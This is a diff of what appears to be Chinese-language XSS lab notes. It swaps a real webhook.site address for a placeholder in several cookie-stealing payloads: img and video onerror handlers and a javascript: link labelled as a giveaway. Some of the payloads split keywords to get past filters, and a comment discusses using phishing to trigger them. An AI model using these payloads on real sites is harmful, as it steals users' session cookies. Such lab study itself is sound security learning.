@@ -48,21 +48,21 @@ setTimeout(() => {
 # 大大大,小小小
 
 ```
-<ImG sRc=x OnErRoR="new Image().src='https://webhook.site/fc61e07f-6e96-4161-915c-010cb2fef8ee?c='+window['doc'+'ument']['cook'+'ie']">
+<ImG sRc=x OnErRoR="new Image().src='https://webhook.site/xxx?c='+window['doc'+'ument']['cook'+'ie']">
 // 在靶场：其实img根本不用大小写绕过，只需要修改cookie这个关键词即可，但是触发条件在实战可想而知，除非是钓鱼，但是现在一般都是先丢给ai看网站类型以及内容，所以钓鱼要求也越来越高了
-<a href="JaVaScRiPt:location='https://webhook.site/fc61e07f-6e96-4161-915c-010cb2fef8ee?c='+encodeURIComponent(window['doc'+'ument']['coo'+'kie'])">点击领取</a>
+<a href="JaVaScRiPt:location='https://webhook.site/xxx?c='+encodeURIComponent(window['doc'+'ument']['coo'+'kie'])">点击领取</a>
 ```
 
 # 我爱看视频你爱看什么？
 
 ```
-<video src=x onerror="new Image().src='https://webhook.site/fc61e07f-6e96-4161-915c-010cb2fef8ee?c='+document.cookie"></video>
+<video src=x onerror="new Image().src='https://webhook.site/xxx?c='+document.cookie"></video>
 ```
 
 # 你知道图片标签吗
 
 ```
-<img src=x onerror="new Image().src='https://webhook.site/fc61e07f-6e96-4161-915c-010cb2fef8ee?c='+document.cookie">
+<img src=x onerror="new Image().src='https://webhook.site/xxx?c='+document.cookie">
 ```
 
 # 登录框存在反射型XSS
